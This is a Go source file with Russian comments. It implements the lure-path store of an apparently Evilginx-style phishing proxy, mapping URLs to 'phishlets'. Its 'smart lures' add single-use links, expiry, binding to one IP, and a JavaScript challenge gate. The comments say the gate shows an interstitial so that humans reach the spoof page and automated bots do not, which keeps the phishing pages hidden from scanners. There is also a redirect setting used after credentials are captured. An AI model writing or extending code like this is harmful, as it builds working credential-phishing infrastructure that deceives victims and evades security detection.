// Package lures — пути-приманки /l/* (Evilginx lures паритет) + Smart Lures:
// одноразовые, TTL, IP-bind, challenge-gate. core.LureStore заморожен,
// smart-функции — расширением через интерфейс SmartResolver (type-assert в engine).
package lures

import (
	"fmt"
	"sync"
	"time"
)

type Store struct {
	mu    sync.RWMutex
	m     map[string]string // path -> phishletID (legacy static)
	smart map[string]*Smart
	// OnUse вызывается (без лока) при каждом списании использования.
	OnUse func(path string, uses int)
}

// Smart — одноразовая/условная приманка.
type Smart struct {
	Path             string
	PhishletID       string
	ExpiresAt        time.Time // zero = без срока
	MaxUses          int       // 0 = безлимит, 1 = одноразовая
	Uses             int
	BoundIP          string // "" = любой IP
	RequireChallenge bool   // нужен cookie __fp_ok=1
	RedirectURL      string // lure override для post-capture redirect
}

// RedirectFor возвращает redirect_url живой приманки ("" = нет).
func (s *Store) RedirectFor(path string) string {
	s.mu.RLock()
	defer s.mu.RUnlock()
	if pid, ok := s.m[path]; ok && pid != "" {
		return ""
	}
	if sm, ok := s.smart[path]; ok {
		if !sm.ExpiresAt.IsZero() && time.Now().After(sm.ExpiresAt) {
			return ""
		}
		return sm.RedirectURL
	}
	return ""
}

func New() *Store { return &Store{m: map[string]string{}, smart: map[string]*Smart{}} }

func (s *Store) Add(path, phishletID string) {
	s.mu.Lock()
	s.m[path] = phishletID
	s.mu.Unlock()
}

func (s *Store) Resolve(path string) (string, bool) {
	s.mu.RLock()
	defer s.mu.RUnlock()
	v, ok := s.m[path]
	return v, ok
}

// SeedFromPhishlets — автоприманки из LurePath каждого phishlet.
func (s *Store) Seed(id, lurePath string) {
	if lurePath == "" {
		return
	}
	s.Add(lurePath, id)
}

// SmartCreate — валидация + запись smart-приманки.
func (s *Store) SmartCreate(sm Smart) error {
	if sm.Path == "" || len(sm.Path) < 4 || sm.Path[:3] != "/l/" {
		return fmt.Errorf("smart lure path must start with /l/")
	}
	if sm.PhishletID == "" {
		return fmt.Errorf("phishlet_id required")
	}
	if !sm.ExpiresAt.IsZero() && time.Until(sm.ExpiresAt) <= 0 {
		return fmt.Errorf("expires_at in the past")
	}
	if sm.MaxUses < 0 {
		return fmt.Errorf("max_uses must be >= 0")
	}
	s.mu.Lock()
	s.smart[sm.Path] = &sm
	s.mu.Unlock()
	return nil
}

// SmartResolver реализуют smart-сторы; engine проверяет через type-assert.
type SmartResolver interface {
	ResolveSmart(path, ip string, fpOK bool) (string, bool)
}

// ResolveSmart — проверка TTL/uses/IP/challenge + списание использования.
func (s *Store) ResolveSmart(path, ip string, fpOK bool) (string, bool) {
	s.mu.Lock()
	var cb func()
	defer func() {
		s.mu.Unlock()
		if cb != nil {
			cb() // уже без лока: персист не тормозит чек
		}
	}()
	// Legacy static всегда валидны (обратная совместимость).
	if pid, ok := s.m[path]; ok {
		return pid, true
	}
	sm, ok := s.smart[path]
	if !ok {
		return "", false
	}
	if !sm.ExpiresAt.IsZero() && time.Now().After(sm.ExpiresAt) {
		delete(s.smart, path)
		return "", false
	}
	if sm.MaxUses > 0 && sm.Uses >= sm.MaxUses {
		delete(s.smart, path)
		return "", false
	}
	if sm.BoundIP != "" && sm.BoundIP != ip {
		return "", false
	}
	if sm.RequireChallenge && !fpOK {
		return "", false
	}
	sm.Uses++
	pid := sm.PhishletID
	uses := sm.Uses
	if sm.MaxUses > 0 && sm.Uses >= sm.MaxUses {
		delete(s.smart, path) // одноразовая сгорела
	}
	if s.OnUse != nil {
		cb = func() { s.OnUse(path, uses) }
	}
	return pid, true
}

// ChallengeRequired: приманка существует и ждет только challenge.
// Используется движком чтобы отдать interstitial вместо spoof:
// человек с JS проходит за пару секунд, бот — нет.
func (s *Store) ChallengeRequired(path, ip string) bool {
	s.mu.RLock()
	defer s.mu.RUnlock()
	if _, ok := s.m[path]; ok {
		return false
	}
	sm, ok := s.smart[path]
	if !ok || !sm.RequireChallenge {
		return false
	}
	if !sm.ExpiresAt.IsZero() && time.Now().After(sm.ExpiresAt) {
		return false
	}
	if sm.MaxUses > 0 && sm.Uses >= sm.MaxUses {
		return false
	}
	if sm.BoundIP != "" && sm.BoundIP != ip {
		return false
	}
	return true
}

// ListSmart — снапшот для API/персистентности.
func (s *Store) ListSmart() []Smart {
	s.mu.RLock()
	defer s.mu.RUnlock()
	out := make([]Smart, 0, len(s.smart))
	for _, sm := range s.smart {
		out = append(out, *sm)
	}
	return out
}
